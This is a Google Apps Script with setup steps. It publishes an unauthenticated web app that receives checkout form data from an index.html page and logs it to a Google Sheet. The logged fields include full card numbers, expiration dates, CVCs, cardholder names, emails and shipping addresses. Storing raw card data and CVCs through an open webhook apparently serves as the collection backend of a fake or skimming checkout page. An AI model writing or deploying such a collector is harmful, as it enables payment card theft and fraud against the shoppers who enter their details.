// Google Apps Script — paste this into a script bound to your Google Sheet
// (Extensions → Apps Script), then Deploy → New deployment → type "Web app",
// "Execute as: Me", "Who has access: Anyone". Copy the /exec URL it gives you
// and paste it into SHEET_WEBHOOK_URL inside index.html.

const HEADERS = [
  'timestamp','email','card_number','expiration','cvc','cardholder',
  'country','zip',
  'ship_name','ship_line1','ship_line2','ship_city','ship_state','ship_zip','ship_country',
  'save_info','product','amount_usd','user_agent','page'
];

function doPost(e) {
  const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();

  // Write header row once
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
  }

  let data = {};
  try {
    data = JSON.parse(e.postData.contents);
  } catch (err) {
    return ContentService.createTextOutput('bad json').setMimeType(ContentService.MimeType.TEXT);
  }

  const row = HEADERS.map(h => data[h] !== undefined ? data[h] : '');
  sheet.appendRow(row);

  return ContentService
    .createTextOutput(JSON.stringify({ok: true}))
    .setMimeType(ContentService.MimeType.JSON);
}

// Optional: lets you visit the /exec URL in a browser to confirm it deployed
function doGet() {
  return ContentService.createTextOutput('ok').setMimeType(ContentService.MimeType.TEXT);
}
